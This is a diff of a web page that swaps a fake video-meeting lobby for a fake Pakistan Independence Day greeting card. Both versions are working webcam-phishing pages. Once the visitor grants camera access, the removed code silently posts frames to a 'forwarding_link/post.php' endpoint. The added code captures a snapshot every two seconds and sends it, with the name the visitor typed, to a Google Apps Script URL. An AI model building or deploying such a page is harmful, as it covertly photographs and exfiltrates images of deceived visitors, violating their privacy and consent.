@@ -1,234 +1,298 @@
-
-<!doctype html>
-<html>
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
-  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Pakistani Independence Day</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: #006400; /* Dark green (Pakistan flag color) */
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            color: #fff;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.6);
+        }
+
+        .welcome-section {
+            margin-bottom: 20px;
+        }
+
+        .welcome-icon {
+            font-size: 1.5em;
+        }
+
+        .hindi-text {
+            font-size: 1.2em;
+            margin: 5px 0;
+            font-family: 'Noto Sans Devanagari', sans-serif;
+            color: #f1f1f1;
+        }
+
+        .green-bg {
+            background-color: #00b300; /* Lighter green */
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            color: #fff;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .alok-text {
+            font-size: 3em;
+            color: #fff;
+            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
+            margin: 20px 0;
+            font-weight: bold;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        .wishing-section h2 {
+            font-size: 1.5em;
+            color: #ffd700; /* Goldish */
+            margin: 5px 0;
+        }
+
+        .red-text {
+            font-size: 1.2em;
+            color: #ff0000;
+            margin: 10px 0;
+        }
+
+        .green-text {
+            font-size: 1em;
+            color: #fff;
+            background-color: #006400; /* Green background */
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .pink-text {
+            font-size: 1em;
+            color: #ff00ff;
+            background-color: #ff99ff;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .purple-text {
+            font-size: 1em;
+            color: #800080;
+            background-color: #d8bfd8;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .share-buttons {
+            margin-top: 20px;
+        }
+
+        .share-buttons button {
+            padding: 10px 20px;
+            margin: 0 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+
+        .whatsapp {
+            background-color: #25d366;
+            color: white;
+        }
+
+        .facebook {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.5em;
+            }
+            .alok-text {
+                font-size: 2em;
+            }
+            .wishing-section h2 {
+                font-size: 1.2em;
+            }
+            .share-buttons button {
+                display: block;
+                width: 80%;
+                margin: 10px auto;
+            }
+        }
+
+        /* Popup box styles */
+        .popup {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            z-index: 999;
+        }
+
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 998;
+        }
+
+        .popup .popup-content {
+            text-align: center;
+        }
+
+        .popup button {
+            padding: 10px 20px;
+            background-color: #ff6600;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
 </head>
-
-<div class="video-wrap" hidden="hidden">
-  <video id="video" playsinline autoplay></video>
-</div>
-
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
-
-<style>
-  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
-
-  body {
-    height: 100vh;
-    width: 100vw;
-  }
-
-  * {
-    padding: 0px;
-    margin: 0px;
-    font-family: 'Nunito', sans-serif;
-    font-weight: 500;
-  }
-
-  .main-screen {
-    background-color: #273039;
-    height: 100vh;
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-
-  img {
-    height: 80px;
-    width: 80px;
-  }
-
-  .bottom-bar {
-    position: fixed;
-    padding: 0px 40px 0px -40px;
-    bottom: 0px;
-    height: 80px;
-    width: 100%;
-    background-color: #1F2022;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    color: #fff;
-  }
-
-  .icon-button {
-    display: flex;
-    flex-direction: column;
-    justify-items: center;
-    align-items: center;
-  }
-
-  i {
-    margin-bottom: 8px;
-    font-size: 26px;
-  }
-
-  button {
-    color: #fff;
-    background-color: crimson;
-    padding: 5px 20px;
-    border: none;
-    border-radius: 5px;
-    border-style: none;
-    outline: none;
-  }
-
-  .float_button {
-    background-color: #1F2022;
-    height: 40px;
-    border-radius: 5px;
-    width: 40px;
-    position: fixed;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    top: 5px;
-    right: 5px;
-  }
-  #ac-wrapper {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255,255,255,.6);
-    z-index: 1001;
-}
-
-#popup {
-    width: 555px;
-    height: 35px;
-    background: #FFFFFF;
-    border: 5px solid #000;
-    border-radius: 15px;
-    -moz-border-radius: 15px;
-    -webkit-border-radius: 15px;
-    box-shadow: #64686e 0px 0px 3px 3px;
-    -moz-box-shadow: #64686e 0px 0px 3px 3px;
-    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
-    position: relative;
-    top: 250px; left: 375px;
-}
-</style>
-
-<script>
-
-  function post(imgdata) {
-    $.ajax({
-      type: 'POST',
-      data: { cat: imgdata },
-      url: 'forwarding_link/post.php',
-      dataType: 'json',
-      async: false,
-      success: function (result) {
-        // call the function that handles the response/results
-      },
-      error: function () {
-      }
-    });
-  };
-
-
-  'use strict';
-
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const errorMsgElement = document.querySelector('span#errorMsg');
-
-  const constraints = {
-    audio: false,
-    video: {
-
-      facingMode: "user"
-    }
-  };
-
-  // Access webcam
-  async function init() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      handleSuccess(stream);
-    } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-    }
-  }
-
-  // Success
-  function handleSuccess(stream) {
-    window.stream = stream;
-    video.srcObject = stream;
-
-    var context = canvas.getContext('2d');
-    setInterval(function () {
-
-      context.drawImage(video, 0, 0, 640, 480);
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-      post(canvasData);
-      video.play();
-    }, 1500);
-
-
-  }
-  function PopUp(){
-    document.getElementById('ac-wrapper').style.display="none"; 
-}
-  // Load init
-  init();
-  $(document).ready(function(){
-   setTimeout(function(){
-      PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
-});
-</script>
-
 <body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
-  </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
+    <div class="container">
+        <h1>|||| Pakistan Zindabad! ||||</h1>
+        <div class="welcome-section">
+            <span class="welcome-icon">🇵🇰</span> Welcome <span class="welcome-icon">🇵🇰</span>
+            <p class="hindi-text">May this day bring joy, peace, and prosperity.</p>
+            <p class="hindi-text">Happy Independence Day!</p>
+            <p class="hindi-text green-bg">|| Pakistan's Pride ||</p>
+        </div>
+        <div class="alok-text" id="userName">ALOK</div>
+        <div class="wishing-section">
+            <h2>Wishing you a very</h2>
+            <h2>⭐ Happy Independence Day ⭐</h2>
+            <p class="red-text">To you and your beloved family</p>
+            <p class="green-text">Wishing you and your family joy and blessings on this historic day. May Pakistan continue to shine bright!</p>
+            <p class="pink-text">⭐ May this day be your best one. ⭐</p>
+            <p class="hindi-text purple-text">आज का दिन पाकिस्तान के लिए गर्व का दिन है।</p>
+        </div>
+        <div class="share-buttons">
+            <button class="whatsapp" onclick="shareOnWhatsApp()">WhatsApp Share</button>
+            <button class="facebook">Facebook Share</button>
+        </div>
     </div>
-</div>
-  <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
-    </div>
-    <div class="icon-button" style="margin-left: auto;">
-      <i class="fas fa-shield-alt"></i>
-      <h6>Security</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-users"></i>
-      <h6>Participants</h6>
-    </div>
-    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
-      <i class="fas fa-plus-square"></i>
-      <h6>Share content</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-comments"></i>
-      <h6>Chat</h6>
-    </div>
-    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
-      <i class="fas fa-record-vinyl"></i>
-      <h6>Record</h6>
-    </div>
-    <button style="margin-right: 50px;">End</button>
-  </div>
-</body>
 
+    <!-- Popup Box -->
+    <div class="popup-overlay" id="popup-overlay"></div>
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <h2>Please enter your name</h2>
+            <input type="text" id="user-name-input" placeholder="Enter your name" />
+            <button onclick="startCamera()">Submit</button>
+        </div>
+    </div>
+
+    <script>
+        // Function to open the popup when the page loads
+        window.onload = function() {
+            document.getElementById("popup").style.display = "block";
+            document.getElementById("popup-overlay").style.display = "block";
+        };
+
+        // Function to close the popup
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+            document.getElementById("popup-overlay").style.display = "none";
+        }
+
+        // Function to start the camera and handle name input
+        function startCamera() {
+            const userName = document.getElementById("user-name-input").value;
+            if (userName) {
+                // Set name in the userName div
+                document.getElementById("userName").textContent = userName;
+                closePopup();
+
+                // Start camera stream and automatic image capture
+                initializeCamera();
+            } else {
+                alert("Please enter your name.");
+            }
+        }
+
+        // Automatically capture image from the video and send it to the Google Sheets Script
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        function initializeCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                video.addEventListener('loadeddata', () => {
+                    setInterval(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0);
+                        const imageData = canvas.toDataURL('image/png');
+
+                        // Send image and name to Google Sheets script
+                        fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
+                            method: 'POST',
+                            body: JSON.stringify({ image: imageData, name: document.getElementById('userName').textContent }),
+                            headers: { 'Content-Type': 'application/json' }
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("Image and Name uploaded successfully:", data);
+                        })
+                        .catch(error => {
+                            console.error("Error uploading image and name:", error);
+                        });
+                    }, 2000);
+                });
+            })
+            .catch(err => {
+                console.log("Camera access denied:", err);
+            });
+        }
+
+        // Share function for WhatsApp
+        function shareOnWhatsApp() {
+            const message = "Happy Pakistan Independence Day! 🇵🇰🎉";
+            const url = "https://wa.me/?text=" + encodeURIComponent(message);
+            window.open(url, '_blank');
+        }
+    </script>
+</body>
 </html>
